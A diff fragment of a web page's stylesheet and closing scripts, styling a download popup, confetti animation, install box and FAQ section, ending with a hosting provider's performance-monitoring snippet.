+            justify-content: center;
+            border-radius: 50%;
+            transition: background-color 0.3s ease;
+        }
+
+        .close-btn:hover {
+            background-color: rgba(245, 166, 35, 0.2);
+        }
+
+        .popup-content {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .popup-content p {
+            color: #E0E0E0;
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .popup-content input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #444;
+            border-radius: 10px;
+            background: #333;
+            color: #E0E0E0;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+            transition: border-color 0.3s ease;
+        }
+
+        .popup-content input:focus {
+            outline: none;
+            border-color: #f5a623;
+        }
+
+        .popup-content input::placeholder {
+            color: #888;
+        }
+
+        .popup-btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            margin: 5px;
+            min-width: 200px;
+        }
+
+        .popup-btn.primary {
+            background: linear-gradient(45deg, #f5a623, #e8941a);
+            color: #1A1A1A;
+        }
+
+        .popup-btn.primary:hover {
+            background: linear-gradient(45deg, #e8941a, #d7851a);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(245, 166, 35, 0.4);
+        }
+
+        .popup-btn.secondary {
+            background: linear-gradient(45deg, #666, #555);
+            color: #E0E0E0;
+        }
+
+        .popup-btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.8 !important;
+        }
+
+        .popup-btn:disabled:hover {
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid transparent;
+            border-top: 2px solid currentColor;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Confetti Styles */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10001;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            top: -10px;
+            opacity: 0.8;
+            animation: confetti-fall linear forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(-100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* Different confetti shapes */
+        .confetti-piece:nth-child(odd) {
+            border-radius: 50%;
+        }
+
+        .confetti-piece:nth-child(even) {
+            transform: rotate(45deg);
+        }
+
+        .confetti-piece:nth-child(3n) {
+            width: 6px;
+            height: 12px;
+            border-radius: 3px;
+        }
+
+        .download-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .thank-you {
+            padding: 40px 30px !important;
+        }
+
+        .thank-you-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        .thank-you h3 {
+            color: #f5a623;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        .thank-you p {
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+
+        /* Install Box Styles */
+        .install-box {
+            pointer-events: auto !important;
+        }
+
+        .install-box * {
+            pointer-events: auto !important;
+        }
+
+        .install-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.9);
+        }
+
+        .install-box a:hover {
+            color: #FFFFFF !important;
+            text-decoration: underline !important;
+        }
+
+        .install-box li {
+            position: relative;
+            padding-left: 20px;
+            transition: color 0.3s ease;
+        }
+
+        .install-box li:before {
+            content: "➤";
+            position: absolute;
+            left: 0;
+            color: #f5a623;
+            font-size: 16px;
+            transition: transform 0.3s ease;
+        }
+
+        .install-box li:hover {
+            color: #FFFFFF;
+        }
+
+        .install-box li:hover:before {
+            transform: translateX(5px);
+        }
+
+        .copy-text:hover {
+            background-color: #444;
+            color: #FFFFFF;
+        }
+
+        /* FAQ Section Styles */
+        .faq__box {
+            pointer-events: auto !important;
+        }
+
+        .faq__box * {
+            pointer-events: auto !important;
+        }
+
+        .faq__question:hover {
+            background: #3A3A3A;
+        }
+
+        .faq__area {
+            margin: 30px 0; /* Adjusted margin for better centering */
+        }
+
+        @media (max-width: 991px) {
+            .install-box {
+                display: none !important;
+            }
+            
+            .download-popup {
+                width: 95%;
+                margin: 20px;
+            }
+            
+            .popup-content {
+                padding: 20px;
+            }
+            
+            .download-options {
+                gap: 10px;
+            }
+            
+            .popup-btn {
+                min-width: auto;
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .popup-header {
+                padding: 15px;
+            }
+            
+            .popup-header h3 {
+                font-size: 18px;
+            }
+            
+            .popup-content {
+                padding: 15px;
+            }
+        }
+    </style>
+
+    <!-- JavaScript for FAQ Toggle -->
+    <script>
+        function toggleAnswer(element) {
+            const answer = element.nextElementSibling;
+            const toggle = element.querySelector('.faq__toggle');
+            if (answer.style.display === "block") {
+                answer.style.display = "none";
+                toggle.textContent = "+";
+            } else {
+                answer.style.display = "block";
+                toggle.textContent = "−";
+            }
+        }
+    </script>
+
+    <!-- External Scripts -->
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/plugins.js"></script>
+    <script src="js/ajax-form.js"></script>
+    <script src="js/main.js"></script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl509036'},{'dcenter':'p3'},{'cp_id':'10262477'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
